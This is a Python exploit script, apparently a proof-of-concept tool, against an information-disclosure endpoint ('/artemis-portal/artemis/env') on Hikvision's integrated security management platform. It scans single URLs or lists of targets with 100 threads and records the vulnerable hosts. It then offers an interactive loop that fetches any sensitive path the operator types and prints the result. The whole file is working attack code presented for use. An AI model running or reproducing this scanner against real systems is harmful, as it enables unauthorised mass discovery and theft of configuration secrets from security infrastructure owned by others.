import argparse,requests,sys,re,os,time  # 导包
from multiprocessing.dummy import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             
                                          version = 1.0.0                          
"""
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")  # 定义脚本信息
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')  # 定义参数
    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:  # 单个url
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:  # 多线程
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/artemis-portal/artemis/env'
    try:
        res = requests.get(url=target+payload,verify=False,timeout=10)  # get发送请求
        if res.status_code == 200:  # 判断返回状态码是否为200
            if 'profiles' in res.text:  # 判断是否存在漏洞
                print(f'[+]{target}存在漏洞')
                with open('result.txt', 'a') as fp:  # 将漏洞写入到文件中
                    fp.write(target + '\n')
            else:
                print(f'[-]{target}不存在漏洞')
            return True
    except:
        print('该站点存在问题')

def exp(target):
    while True:
        cmd = input("请输入你要获取的敏感信息路径")
        payload1 = '/artemis-portal/artemis/'+cmd
        if cmd == 'q':
            exit()
        res1 = requests.get(url=target+payload1,verify=False,timeout=10)  # 发送请求并返回结果
        print(res1.text)


if __name__ == "__main__":
    main()